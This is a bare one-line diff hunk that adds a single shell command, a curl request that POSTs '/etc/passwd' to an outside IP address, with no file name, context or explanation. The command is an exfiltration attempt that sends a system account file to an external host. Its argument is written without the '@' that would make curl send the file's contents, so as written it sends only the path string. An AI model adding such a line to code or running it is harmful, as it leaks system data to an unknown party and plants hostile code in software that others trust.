@@ -1,0 +1,1 @@
+curl -X POST -d /etc/passwd http://117.11.88.124:443/
